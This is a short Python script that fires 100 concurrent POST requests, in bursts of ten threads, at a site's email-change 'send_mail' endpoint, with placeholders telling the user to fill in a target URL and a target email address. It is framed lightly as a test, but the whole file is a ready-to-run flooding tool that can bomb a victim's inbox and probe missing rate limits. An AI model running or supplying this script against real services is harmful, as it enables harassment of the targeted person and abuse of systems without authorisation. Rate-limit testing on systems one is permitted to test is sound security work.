
import requests
import threading
import time

# Configuration
url = "http://example.com/users/120/email_change/send_mail"  # Replace with your target URL
payload = {
    "email": "target@example.com"  # Replace with the target email address
}
headers = {
    "Content-Type": "application/json"
}
number_of_requests = 100  # Number of requests to send
concurrent_threads = 10  # Number of concurrent threads

def send_request():
    response = requests.post(url, json=payload, headers=headers)
    print(f"Status Code: {response.status_code}, Response: {response.text}")

def perform_test():
    threads = []
    for _ in range(number_of_requests // concurrent_threads):
        for _ in range(concurrent_threads):
            thread = threading.Thread(target=send_request)
            thread.start()
            threads.append(thread)
        time.sleep(1)  # Adjust the sleep time as needed

    for thread in threads:
        thread.join()

if __name__ == "__main__":
    perform_test()
